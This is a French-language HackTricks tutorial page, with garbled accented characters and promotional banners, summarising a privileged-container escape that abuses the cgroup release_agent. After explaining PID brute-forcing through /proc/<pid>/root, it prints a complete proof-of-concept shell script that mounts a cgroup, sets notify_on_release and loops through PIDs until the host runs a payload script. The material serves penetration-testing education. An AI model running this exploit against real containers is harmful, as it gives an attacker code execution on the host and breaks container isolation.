<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Pour plus de d√©tails, **consultez l'article de blog √† partir de [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)**. Ceci n'est qu'un r√©sum√© :

La technique d√©crit une m√©thode pour **ex√©cuter du code h√¥te depuis un conteneur**, surmontant les d√©fis pos√©s par les configurations du pilote de stockage qui obscurcissent le chemin du syst√®me de fichiers du conteneur sur l'h√¥te, comme Kata Containers ou des param√®tres sp√©cifiques de `devicemapper`.

√âtapes cl√©s :

1. **Localisation des identifiants de processus (PID) :** En utilisant le lien symbolique `/proc/<pid>/root` dans le pseudo-syst√®me de fichiers Linux, n'importe quel fichier dans le conteneur peut √™tre acc√©d√© par rapport au syst√®me de fichiers de l'h√¥te. Cela contourne le besoin de conna√Ætre le chemin du syst√®me de fichiers du conteneur sur l'h√¥te.
2. **PID Bashing :** Une approche de force brute est utilis√©e pour rechercher √† travers les PID sur l'h√¥te. Cela est fait en v√©rifiant s√©quentiellement la pr√©sence d'un fichier sp√©cifique √† `/proc/<pid>/root/<fichier>`. Lorsque le fichier est trouv√©, cela indique que le PID correspondant appartient √† un processus s'ex√©cutant √† l'int√©rieur du conteneur cible.
3. **D√©clenchement de l'ex√©cution :** Le chemin PID devin√© est √©crit dans le fichier `release_agent` des `cgroups`. Cette action d√©clenche l'ex√©cution du `release_agent`. Le succ√®s de cette √©tape est confirm√© en v√©rifiant la cr√©ation d'un fichier de sortie.

### Processus d'exploitation

Le processus d'exploitation implique un ensemble d'actions plus d√©taill√©es, visant √† ex√©cuter une charge utile sur l'h√¥te en devinant le PID correct d'un processus s'ex√©cutant √† l'int√©rieur du conteneur. Voici comment cela se d√©roule :

1. **Initialiser l'environnement :** Un script de charge utile (`payload.sh`) est pr√©par√© sur l'h√¥te, et un r√©pertoire unique est cr√©√© pour la manipulation des cgroups.
2. **Pr√©parer la charge utile :** Le script de charge utile, qui contient les commandes √† ex√©cuter sur l'h√¥te, est √©crit et rendu ex√©cutable.
3. **Configurer le cgroup :** Le cgroup est mont√© et configur√©. Le drapeau `notify_on_release` est d√©fini pour garantir que la charge utile s'ex√©cute lorsque le cgroup est lib√©r√©.
4. **Force brute PID :** Une boucle it√®re √† travers les PID potentiels, √©crivant chaque PID devin√© dans le fichier `release_agent`. Cela d√©finit efficacement le script de charge utile comme le `release_agent`.
5. **D√©clencher et v√©rifier l'ex√©cution :** Pour chaque PID, le `cgroup.procs` du cgroup est √©crit, d√©clenchant l'ex√©cution du `release_agent` si le PID est correct. La boucle continue jusqu'√† ce que la sortie du script de charge utile soit trouv√©e, indiquant une ex√©cution r√©ussie.


PoC de l'article de blog :
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge HackTricks AWS)</strong></a><strong>!</strong></summary>

D'autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
